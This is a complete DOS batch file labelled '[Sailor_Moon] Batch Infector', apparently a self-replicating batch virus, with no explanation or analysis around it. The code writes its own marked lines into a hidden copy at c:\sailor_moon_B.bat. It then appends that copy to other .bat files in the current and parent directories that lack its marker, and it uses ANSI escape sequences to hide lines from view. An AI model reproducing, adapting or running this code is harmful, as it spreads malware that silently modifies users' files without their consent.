@echo off
::[8m --- [Sailor_Moon] Batch Infector ---
if '%2=='sailor_moon_ goto sailor_moon_1
if '%1=='sailor_moon_ echo ["`";"`"p
::["`";"sailor_moon_B sailor_moon_";13p
::[4Asailor_moon_
if exist c:\sailor_moon_B.bat goto sailor_moon_
if not exist %0.bat goto sailor_moon_2
echo @echo Off>c:\sailor_moon_B.bat
find "sailor_moon_"<%0.bat>>c:\sailor_moon_B.bat
attrib c:\sailor_moon_B.bat +h
::[6Asailor_moon_
:sailor_moon_
for %%v in (*.bat) do call c:\sailor_moon_B %%v sailor_moon_
if '%sailor_moon_%==' for %%v in (..\*.bat) do call c:\sailor_moon_B %%v sailor_moon_
set sailor_moon_=
goto sailor_moon_2
::[6Asailor_moon_
:sailor_moon_1
if '%sailor_moon_%=='11 goto sailor_moon_2
find "sailor_moon_"<%1>nul
if not errorlevel 1 goto sailor_moon_2
type c:\sailor_moon_B.bat>>%1
set sailor_moon_=%sailor_moon_%1
:sailor_moon_2 
::sailor_moon_[7A[0m
